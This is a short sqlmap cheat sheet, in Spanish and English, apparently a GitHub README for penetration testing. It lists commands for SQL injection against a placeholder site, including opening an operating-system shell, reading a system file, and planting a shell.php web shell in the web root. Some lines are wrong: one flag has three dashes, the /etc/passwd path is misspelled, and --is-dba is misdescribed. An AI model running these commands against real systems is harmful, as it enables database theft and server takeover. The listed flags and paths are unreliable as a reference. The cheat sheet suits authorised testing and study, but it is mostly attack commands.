<h1 align="center">SQLMap Cheat Sheet</h1>

<p align="center">
  Comprehensive reference guide for automated SQL injection testing, enumeration techniques, data exfiltration, WAF evasion, and advanced attack vectors.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Web_Security-111827?style=for-the-badge&logo=owasp&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/OffSec-Techniques-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/SQLMap-Automated_Exploitation-111827?style=for-the-badge&logoColor=00FFFF">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>


<br>
<br>
<br>

## Basic Inyections

```
sqlmap -u "http://prueba.com/info.php?action=login" 
```
<br>

Datos del login que van en dos variables
```
sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&password=abc"
```
<br>

Uso de Cookies
```
sqlmap -u 'http://prueba.com/info.php?action=login' --cookie="PHPSESSIONS=2wfertyrywsegy34526"
```
<br>

Indicar a todas las preguntas un Yes all
```
sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&password=abc" --batch 
```

<br>
<br>
<br>
<br>

## Basic Parameters

Injection de tipo B,E,U,S,T,Q
```
--technique=E
```

> B: Boolean-based blind |
> E: Error-based |
> U: Union query-based | 
> S: Stacked queries | 
> T: Time-based blind |
> Q: Inline queries |

<br>

Saber que tipo de base de datos tiene por detras
```
 --is-dba
```
<br>


Indicar otro metodo. PUT , HEAD , GET , POST , DELETE , OPTIONS , PATCH
```
 --method PUT
```
<br>

Shell del S.O
```
--os-shell
```

<br>

Read Files
```
---file-read "/etc/password"
```
> Output " ~/.sqlmap/output/www.prueba.com/files/_etc_password"

<br>

Write Files
```
--file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
